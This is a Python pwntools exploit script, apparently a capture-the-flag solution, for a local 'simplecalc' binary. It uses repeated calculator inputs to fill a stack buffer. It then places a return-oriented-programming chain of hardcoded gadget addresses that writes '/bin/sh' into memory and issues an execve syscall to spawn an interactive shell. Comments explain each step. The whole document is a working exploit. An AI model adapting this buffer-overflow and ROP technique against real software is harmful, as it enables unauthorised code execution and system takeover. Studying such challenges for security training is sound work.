from pwn import *

# set target process as execution of simplecalc
target = process("./simplecalc")

# gadget addresses
POP_RAX_RET = 0x44db34
POP_RDI_RET = 0x401b73
POP_RSI_RET = 0x401c87
POP_RDX_RET = 0x437a85
MOV_QWORD_PTR_RDI_RDX_RET = 0x400aba
SYSCALL = 0x400488

# send first input: number of calculations
target.recvuntil("calculations:")
target.sendline("100")

# perform 18 subtractions, each resulting in 100-100=0 (0x0) being placed on stack in the calculations buffer, until return address is reached these zeroes (0x0) serve as junk payload data
for i in range(18):
    target.recvuntil("=>")
    target.sendline("2")
    target.recvuntil("Integer x:")
    target.sendline("100")
    target.recvuntil("Integer y:")
    target.sendline("100")

# after junk data fills stack buffer all the way to return address, it is time to overwrite the return address
# sendAddends sends pairs of integers which when added together (hence operation is addition or '1') will result in 4 lower and 4 higher bytes of all hexadecimal values sent to it being properly placed on stack in little-endian format (this function is mostly used for addresses of gadgets, to put them on stack by performing correct additions of integers (integer representation of address - 100 and 100 added together yield correct hex values placed on stack))
def sendAddends(x):                       # x is the address received in hexadecimal format
    lower32bits = x & 0xffffffff
    higher32bits = ((x & 0xffffffff00000000) >> 32)
    target.recvuntil("=>")
    target.sendline("1")
    target.recvuntil("Integer x:")
    target.sendline("100")
    target.recvuntil("Integer y:")
    target.sendline(str(lower32bits - 100))
    target.recvuntil("=>")
    target.sendline("1")
    target.recvuntil("Integer x:")
    target.sendline("100")
    target.recvuntil("Integer y:")
    target.sendline(str(higher32bits - 100))

# first fill stack buffer overflow area (from return address onwards) with gadgets that put "/bin/sh" in hex into 0x6c1000, which is an area in memory we can freely write to
sendAddends(POP_RDI_RET)
sendAddends(0x6c1000)
sendAddends(POP_RDX_RET)
sendAddends(0x0068732f6e69622f)
sendAddends(MOV_QWORD_PTR_RDI_RDX_RET)

# now sending gadgets that will perform the execve system call with "/bin/sh" and pop the shell
sendAddends(POP_RAX_RET)
sendAddends(0x3b)
sendAddends(POP_RDI_RET)
sendAddends(0x6c1000)
sendAddends(POP_RSI_RET)
sendAddends(0x0)
sendAddends(POP_RDX_RET)
sendAddends(0x0)
sendAddends(SYSCALL)

# finally once all the gadgets's addresses have (through addition of correct integers above) been placed in the malloc()-ed heap area, we send '5' as calculation option, which performs memcpy and puts all that data into vulnerable stack area which effectively oveflows the return address and redirects execution to pop the shell
target.recvuntil("=>")
target.sendline("5")
target.interactive()
